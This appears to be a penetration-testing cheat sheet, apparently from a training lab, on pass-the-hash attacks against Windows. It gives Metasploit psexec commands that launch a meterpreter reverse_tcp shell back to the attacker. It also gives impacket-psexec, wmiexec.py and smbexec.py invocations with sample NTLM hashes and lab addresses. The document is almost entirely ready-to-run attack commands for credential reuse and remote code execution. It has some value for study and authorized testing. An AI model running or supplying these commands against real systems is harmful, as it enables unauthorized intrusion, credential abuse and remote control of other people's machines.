
#### Pass-the-hash using metasploit:
```bash
#using domain user.
msfconsole -x "use exploit/windows/smb/psexec; \
set RHOSTS <IP-Address>; \
set SMBDomain <Domain-name>; \
set SMBUser <user>; \
set SMBPass <password or hash>; \
set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
set LHOST <local-ip>; \
set LPORT <local-port>; \
exploit"

#using local user.
msfconsole -x "use exploit/windows/smb/psexec; \
set RHOSTS <IP-Address>; \
set SMBUser <user>; \
set SMBPass <password or hash>; \
set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
set LHOST <local-ip>; \
set LPORT <local-port>; \
exploit"

```


PtH using psexec:
```bash
#using domain account password,hash
impacket-psexec marvel.local/fcastle:'Password123'@192.168.154.131

impacket-psexec marvel.local/fcastle:@192.168.154.131
Password:

#using local account hash.
impacket-psexec administrator@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
```

Pth using  wmiexec.py & smbexec.py
```bash
wmiexec.py <domain>/<username>@<target> -hashes <LMhash>:<NThash>
wmiexec.py DOMAIN/Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:6b3a55e0261b0304143f805a249b850a

smbexec.py <domain>/<username>@<target> -hashes <LMhash>:<NThash>
smbexec.py DOMAIN/Administrator@192.168.1.20 -hashes aad3b435b51404eeaad3b435b51404ee:6b3a55e0261b0304143f805a249b850a

```